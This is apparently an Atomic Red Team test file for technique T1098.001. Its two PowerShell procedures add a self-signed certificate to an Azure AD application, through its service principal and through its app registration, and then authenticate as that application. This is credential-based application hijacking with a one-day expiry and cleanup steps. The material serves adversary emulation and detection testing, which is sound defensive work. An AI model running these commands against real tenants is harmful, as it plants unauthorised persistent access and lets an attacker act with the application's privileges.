attack_technique: T1098.001
display_name: Additional Cloud Credentials
atomic_tests:
- name: Azure AD Application Hijacking - Service Principal
  auto_generated_guid: b8e747c3-bdf7-4d71-bce2-f1df2a057406
  description: |
    Add a certificate to an Application through its Service Principal.
    The certificate can then be used to authenticate as the application and benefit from its rights.
    An account with high-enough Azure AD privileges is needed, such as Global Administrator or Application Administrator. The account authentication must be without MFA.
  supported_platforms:
  - windows
  input_arguments:
    username:
      description: Azure AD username
      type: String
    password:
      description: Azure AD password
      type: String
    application:
      description: Targeted Application
      type: String
      default: "SuperApplication"
    certificate_password:
      description: Password of the new certificate
      type: string
      default: Passw0rd
    path_to_cert:
      description: Path of the new certificate, locally stored 
      type: string
      default: $env:TEMP
  dependency_executor_name: powershell
  dependencies:
  - description: |
      AzureAD module must be installed and imported.
    prereq_command: |
      if (Get-Module AzureAD) {exit 0} else {exit 1}
    get_prereq_command: |
      Install-Module -Name AzureAD -Force
      Import-Module -Name AzureAD
  executor:
    command: |
      $PWord = ConvertTo-SecureString -String "#{password}" -AsPlainText -Force
      $Credential = New-Object -TypeName System.Management.Automation.PSCredential -ArgumentList #{username}, $Pword
      Connect-AzureAD -Credential $Credential

      $sp = Get-AzureADServicePrincipal -Searchstring #{application}
      # in the context of an ART test (and not a real attack), we don't need to keep access for too long. In case the cleanup command isn't called, it's better to ensure that everything expires after 1 day so it doesn't leave this backdoor open for too long
      $notAfter = (Get-Date).AddDays(1) 
      $thumb = (New-SelfSignedCertificate -DnsName "atomicredteam.example.com" -CertStoreLocation "cert:\LocalMachine\My" -KeyExportPolicy Exportable -Provider "Microsoft Enhanced RSA and AES Cryptographic Provider" -NotAfter $notAfter).Thumbprint
      $pwd = ConvertTo-SecureString -String #{certificate_password} -Force -AsPlainText
      Export-PfxCertificate -cert "cert:\localmachine\my\$thumb" -FilePath #{path_to_cert}'\'#{application}'.pfx' -Password $pwd

      $cert = New-Object System.Security.Cryptography.X509Certificates.X509Certificate(#{path_to_cert}'\'#{application}'.pfx', $pwd)
      $keyValue = [System.Convert]::ToBase64String($cert.GetRawCertData())

      New-AzureADServicePrincipalKeyCredential -ObjectId $sp.ObjectId -Type AsymmetricX509Cert -Usage Verify -Value $keyValue -EndDate $notAfter

      $tenant=Get-AzureADTenantDetail
      Connect-AzureAD -TenantId $tenant.ObjectId -ApplicationId  $sp.AppId -CertificateThumbprint $thumb
      Get-AzureADCurrentSessionInfo

    cleanup_command: |
      Disconnect-AzureAD
      rm #{path_to_cert}'\'#{application}'.pfx'
    name: powershell
    elevation_required: false

- name: Azure AD Application Hijacking - App Registration
  auto_generated_guid: a12b5531-acab-4618-a470-0dafb294a87a
  description: |
    Add a certificate to an Application through its App Registration.
    The certificate can then be used to authenticate as the application and benefit from its rights.
    An account with high-enough Azure AD privileges is needed, such as Global Administrator or Application Administrator. The account authentication must be without MFA.
  supported_platforms:
  - windows
  input_arguments:
    username:
      description: Azure AD username
      type: String
    password:
      description: Azure AD password
      type: String
    application:
      description: Targeted Application 
      type: String
      default: "SuperApplication"
    certificate_password:
      description: Password of the new certificate
      type: string
      default: Passw0rd
    path_to_cert:
      description: Path of the new certificate, locally stored 
      type: string
      default: $env:TEMP
  dependency_executor_name: powershell
  dependencies:
  - description: |
      AzureAD module must be installed and imported.
    prereq_command: |
      if (Get-Module AzureAD) {exit 0} else {exit 1}
    get_prereq_command: |
      Install-Module -Name AzureAD -Force
      Import-Module -Name AzureAD
  executor:
    command: |
      $PWord = ConvertTo-SecureString -String "#{password}" -AsPlainText -Force
      $Credential = New-Object -TypeName System.Management.Automation.PSCredential -ArgumentList #{username}, $Pword
      Connect-AzureAD -Credential $Credential

      $app = Get-AzureADApplication -Searchstring #{application}
      $notAfter = (Get-Date).AddDays(1)  
      $thumb = (New-SelfSignedCertificate -DnsName "drumkit.onmicrosoft.com" -CertStoreLocation "cert:\LocalMachine\My"  -KeyExportPolicy Exportable -Provider "Microsoft Enhanced RSA and AES Cryptographic Provider" -NotAfter $notAfter).Thumbprint
      $pwd = ConvertTo-SecureString -String #{certificate_password} -Force -AsPlainText
      Export-PfxCertificate -cert "cert:\localmachine\my\$thumb" -FilePath #{path_to_cert}'\'#{application}'.pfx' -Password $pwd

      $cert = New-Object System.Security.Cryptography.X509Certificates.X509Certificate(#{path_to_cert}'\'#{application}'.pfx', $pwd)
      $keyValue = [System.Convert]::ToBase64String($cert.GetRawCertData())

      New-AzureADApplicationKeyCredential -ObjectId $app.ObjectId -Type AsymmetricX509Cert -Usage Verify -Value $keyValue -EndDate $notAfter

      $tenant=Get-AzureADTenantDetail
      Connect-AzureAD -TenantId $tenant.ObjectId -ApplicationId  $app.AppId -CertificateThumbprint $thumb
      Get-AzureADCurrentSessionInfo

    cleanup_command: |
      Disconnect-AzureAD
      rm #{path_to_cert}'\'#{application}'.pfx'
    name: powershell
    elevation_required: false
    
